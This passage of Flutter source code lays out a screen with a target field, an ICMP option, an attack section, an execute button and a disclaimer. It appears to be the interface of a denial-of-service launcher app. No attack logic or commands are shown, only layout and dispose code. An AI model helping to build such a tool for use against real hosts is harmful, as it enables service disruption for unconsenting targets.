  // ── Build ───────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              child: Column(
                children: [
                  _buildHeader(),
                  const SizedBox(height: 18),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 20),
                    child: Column(
                      children: [
                        _buildTargetSection(isIcmp),
                        const SizedBox(height: 18),
                        _buildAttackSection(),
                        const SizedBox(height: 18),
                        _buildExecuteButton(),
                        const SizedBox(height: 14),
                        _buildDisclaimer(),
                        const SizedBox(height: 30),
                        _buildFooter(),
                        const SizedBox(height: 30),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
          // Speed dial
          Positioned(bottom: 30, right: 20, child: _buildSpeedDial()),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _glowController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    portController.dispose();
    commandController.dispose();
    _videoController?.dispose();
    super.dispose();
  }
}
